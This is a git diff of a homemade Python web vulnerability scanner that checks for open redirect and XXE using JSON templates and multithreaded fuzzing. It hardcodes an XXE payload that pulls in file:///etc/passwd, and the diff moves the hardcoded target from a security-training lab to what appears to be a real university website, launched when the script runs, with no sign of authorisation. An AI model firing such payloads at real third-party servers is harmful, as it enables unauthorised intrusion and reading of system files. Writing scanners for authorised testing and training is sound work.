@@ -2,15 +2,27 @@ import json
 import re
 import urllib3
 from queue import Queue
-from threading import Thread,Lock
+from threading import Thread, Lock
+from flask import Flask, request
 
 
+class WebBody:
+    status_code: int = 500
+    content: str = ""
+    headers: dict = {}
+
+    def __init__(self, status_code="", content="", headers=""):
+        self.status_code = status_code
+        self.content = content
+        self.headers = headers
+
+
+web_body = WebBody()
 
 
 class Fuzzer:
 
-
-    def __init__(self,url):
+    def __init__(self, url):
         self.url = url
         # self.file = file
         # self.readFile()
@@ -19,64 +31,58 @@ class Fuzzer:
         self.thread_Lock = Lock()
         self.init()
 
-
-
     def scan(self, payload):
-        global responseheaders,status,responsebody
-        http=urllib3.PoolManager()
-        url=f'{self.url}/{payload}',
-        r=http.request(
+        global responseheaders, status, responsebody
+        http = urllib3.PoolManager()
+        url = f'{self.url}/{payload}',
+        r = http.request(
             data['request']['method'],
             url=f'{self.url}/{payload}',
             headers=data['request']['headers'],
             redirect=data['request']['redirects']
         )
         print(f'{url} {r.status}')
-        responseheaders=r.headers
-        #print(responseheaders)
-        responsebody=r.data
-        status=r.status
+        responseheaders = r.headers
+        # print(responseheaders)
+        responsebody = r.data
+        status = r.status
         self.checkers()
-        
-
 
     def checkers(self):
-        flag=False 
-        #try:
+        flag = False
+        # try:
         for matcher in data['matches']:
-            if matcher['type']=='status':
+            if matcher['type'] == 'status':
                 for code in matcher['status']:
-                    if status==code:
-                        flag=True
-                        print(f"Status Code : {flag}")
-    
-        
-            if matcher['type']=='body':
+                    if status == code:
+                        flag = True
+                        # print(f"Status Code : {flag}")
+                        web_body.status_code = flag
+
+            if matcher['type'] == 'body':
                 pass
-                    
-            if matcher['type']=='regex':
+
+            if matcher['type'] == 'regex':
                # print(data['id'])
-                if matcher['part']=='header':
+                if matcher['part'] == 'header':
                     if matcher['key'] in responseheaders:
-                        head=f'{matcher["key"]}: {responseheaders[matcher["key"]]}'
+                        head = f'{matcher["key"]}: {responseheaders[matcher["key"]]}'
                         print(head)
-                        #reg=r"(?m)^(?:Server\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)cloudflare\/?(\/|[^.].*)?$"
-                        reg=r"(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$"
-                        regmatch=Engine.regex_match(self,reg,head)
+                        # reg=r"(?m)^(?:Server\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)cloudflare\/?(\/|[^.].*)?$"
+                        reg = r"(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$"
+                        regmatch = Engine.regex_match(self, reg, head)
                         print(f"Pattern found : {regmatch}")
-                
-                if matcher['part']=='body':
+
+                if matcher['part'] == 'body':
                    # print(responsebody)
-                    reg=matcher['regex']
-                    b=responsebody.decode('utf-8')
-                    regmatch=Engine.regex_match(self,reg,b)
+                    reg = matcher['regex']
+                    b = responsebody.decode('utf-8')
+                    regmatch = Engine.regex_match(self, reg, b)
                     print(f"Pattern found : {regmatch}")
 
-        self.matchersCondition(flag,regmatch)
+        self.matchersCondition(flag, regmatch)
 
-
-
-    def matchersCondition(self,flag,regmatch):
+    def matchersCondition(self, flag, regmatch):
         if data['matchers-condition'] == 'and':
             if flag and regmatch:
                 print("Vulnerability Found")
@@ -89,8 +95,6 @@ class Fuzzer:
                 print("Vulnerability Found")
                 return True
 
-
-
     def extract(self):
         while True:
             try:
@@ -102,15 +106,11 @@ class Fuzzer:
             except Exception as E:
                 print("Error occurred: {}".format(E))
 
-    
-
     def readFile(self):
         global data
         with open(self.file) as json_file:
             data = json.loads(json_file.read())
             return data
-
-
 
     def init(self, threads=100):
         try:
@@ -127,78 +127,76 @@ class Fuzzer:
             print("CTRL+C detected!")
 
 
-
-
-
 class Engine(Fuzzer):
 
-    def __init__(self,url,file):
-        self.url=url
-        self.file=file
+    def __init__(self, url, file):
+        self.url = url
+        self.file = file
         self.readFile()
       #  self.req()
       #  print(self.match())
        # self.status()
+
+    def start(self):
         self.request()
 
-
     def request(self):
-        if data['request']['payloads']==True:
-            f=Fuzzer(self.url)
-        elif data['request']['payloads']==False:
+        if data['request']['payloads'] == True:
+            f = Fuzzer(self.url)
+        elif data['request']['payloads'] == False:
             self.req()
 
-
     def req(self):
-        global status,responseheaders,flag,responsebody
+        global status, responseheaders, flag, responsebody
 
-        body='''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'''
-        
-        http=urllib3.PoolManager()
+        body = '''<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'''
+
+        http = urllib3.PoolManager()
         print(f"payloads : {data['request']['payloads']}")
-        if data['request']['method']=='GET':
-                r=http.request(
+        if data['request']['method'] == 'GET':
+            r = http.request(
                 data['request']['method'],
                 url=self.url,
                 headers=data['request']['headers'],
                 redirect=data['request']['redirects'],
             )
-        
 
-        elif data['request']['method']=='POST':
-            r=http.request(
+        elif data['request']['method'] == 'POST':
+            r = http.request(
                 data['request']['method'],
                 url=self.url,
                 headers=data['request']['headers'],
                 body=body
-               # body=data['request']['body']
+                # body=data['request']['body']
             )
       #  print(r.headers)
-        status=r.status
-        responseheaders=r.headers
-        responsebody=r.data
+        status = r.status
+        responseheaders = r.headers
+        responsebody = r.data
         print(status)
       #  print(responseheaders)
        # print(r.data)
         self.checkers()
- 
 
-    def regex_match(self,regex, string):
+    def regex_match(self, regex, string):
         matches = re.finditer(regex, string, re.MULTILINE | re.IGNORECASE)
         for match in matches:
             return True
         return False
 
 
+def start(url):
+    files = [
+        'vulns/blueprints/openredirect.json',
+        'vulns/blueprints/xxe.json'
+    ]
+    for file in files:
+        Engine(url, file).start()
 
 
-    
+# fuff=Fuzzer('http://au.edu.pk','vulns/templates/openredirect.json')
+engine = Engine('https://au.edu.pk/',
+                'vulns/blueprints/xxe.json').start()
 
-#fuff=Fuzzer('http://au.edu.pk','vulns/templates/openredirect.json')
-engine=Engine('https://0a8500b80342dbe7c064220400ac0080.web-security-academy.net/product/stock','vulns/templates/xxe.json')
-
-    
 
 # https://ptl-b00d72f4-cf435e49.libcurl.so/redirect.php?uri=https://example.com
-
-
